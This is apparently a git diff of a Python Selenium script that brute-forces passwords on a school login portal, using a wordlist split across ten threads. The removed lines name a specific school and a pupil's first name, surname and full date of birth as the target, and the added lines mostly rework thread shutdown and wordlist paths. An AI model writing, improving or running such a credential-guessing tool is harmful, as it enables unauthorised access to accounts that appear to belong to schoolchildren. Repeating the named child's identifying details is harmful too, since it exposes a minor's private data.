@@ -28,12 +28,12 @@ def wizard():
     login_btn_selector = "body > div.container > div > div > form > p.text-center > button"
     failed_btn_selector = "body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button"
     #body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button
-    school="Queensmead School" #enter school name here
-    username5="2007"#year e.g. 2007
-    username4="August"#month e.g. January
-    username3="30"#day e.g. 4
-    username2= "Edwards"#lastname e.g. Doe
-    username1 = "Ryan"#firstname e.g. Jhon
+    school="" #enter school name here
+    username5=""#year e.g. 2007
+    username4=""#month e.g. January
+    username3=""#day e.g. 4
+    username2= ""#lastname e.g. Doe
+    username1 = ""#firstname e.g. Jhon
     pass_list="C:/actualwordlist/wordlist"+numberofconcurrent+".txt"# ACTUAL F FILE
     brutes(pore,donesofar,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector)
 
@@ -83,20 +83,30 @@ def brutes(pore,donesofar,failed_btn_selector,school,website,username5,username4
                        try:
                              failed = browser.find_element_by_css_selector(failed_btn_selector)
                              failed.send_keys(Keys.RETURN)
-			                 t.sleep(1)
+			     t.sleep(1)
                              bp=1
                        except: 
 			 try:
 			     Sel_pas.send_keys(Keys.ENTER)
 			     t.sleep(1)
-                 print('\rFailed element not found!', end='')
-                 bp=0
+                             print('\rFailed element not found!', end='')
+                             bp=0
 			 except:print("passed")
                     print('\rTried password: '+line+' for '+username1+' '+username2+'.')
                     donesofar=donesofar+1
             except KeyboardInterrupt:
-               possiblepasswords.close()
-               exit()
+		stop_threads = True
+		t1.join()
+		t2.join()
+		t3.join()
+		t4.join()
+		t5.join()
+		t6.join()
+		t7.join()
+		t8.join()
+		t9.join()
+		t10.join()
+                exit()
             except selenium.common.exceptions.NoSuchElementException:
                 print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS: EITHER THE PASSWORD WAS FOUND OR YOU MUST RESTART IT')
                 print('LAST PASS ATTEMPT BELOW OR ABOVE')
@@ -106,6 +116,17 @@ def brutes(pore,donesofar,failed_btn_selector,school,website,username5,username4
 		with open("possible.txt","a") as possiblepasswords:
                 	possiblepasswords.write("The key: |"+str(temp)+"| is possible, at index:"+str(f.index(temp)))
                 	possiblepasswords.write(" or it could mean that the previous key was successful: "+str(f[(f.index(temp))-1])+" or.."+str(f[(f.index(temp))-2])+"\n")
+		stop_threads = True
+		t1.join()
+		t2.join()
+		t3.join()
+		t4.join()
+		t5.join()
+		t6.join()
+		t7.join()
+		t8.join()
+		t9.join()
+		t10.join()
                 exit()
 
 banner ='''
@@ -143,8 +164,8 @@ with open("howmanyconcurrent.txt",'w') as concurrento:
     numberofconcurrent=int(numberofconcurrent)+1#cc
     concurrento.write(str(numberofconcurrent))
 with open("howmanyconcurrent.txt",'r') as concurrent: donesofar,numberofconcurrent,pass_list=0,str((concurrent.readlines())[0]),"a" #cc file made
-
-with open("C:/actualwordlist/wordlist"+numberofconcurrent+".txt","r") as openagain:#change wordlist if needed
+print("Working on wordlist{}.".format(numberofconcurrent))
+with open("C:/Python27/actualwordlist/wordlist"+numberofconcurrent+".txt","r") as openagain:#change wordlist if needed
   pof,al,alist,now="",0,[],0
   for i in openagain:
      pof,al,pgsla="",al+1,list(str(i))
@@ -163,7 +184,6 @@ with open("C:/actualwordlist/wordlist"+numberofconcurrent+".txt","r") as openaga
         for o in range(0,1):pgsla.pop()
         for k in pgsla: pof=pof+k
         alist.append(pof)
-  skipper=al//8
 p,reallylong=[],[]
 list1,list2,list3,list4,list5,list6,list7,list8,list9,list10=[],[],[],[],[],[],[],[],[],[]
 howspicy=9
